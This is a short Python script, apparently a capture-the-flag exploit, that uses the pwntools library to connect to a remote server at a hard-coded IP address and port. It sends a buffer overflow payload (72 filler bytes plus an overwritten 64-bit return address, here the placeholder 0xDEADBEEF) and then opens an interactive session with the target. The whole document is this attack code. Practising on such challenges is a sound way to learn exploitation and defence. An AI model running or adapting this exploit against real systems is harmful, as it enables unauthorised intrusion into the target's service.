from pwn import *

r = remote("103.229.41.18", 5555)

payload = "a"*72 + p64(0xDEADBEEF)
r.sendline(payload)
r.interactive()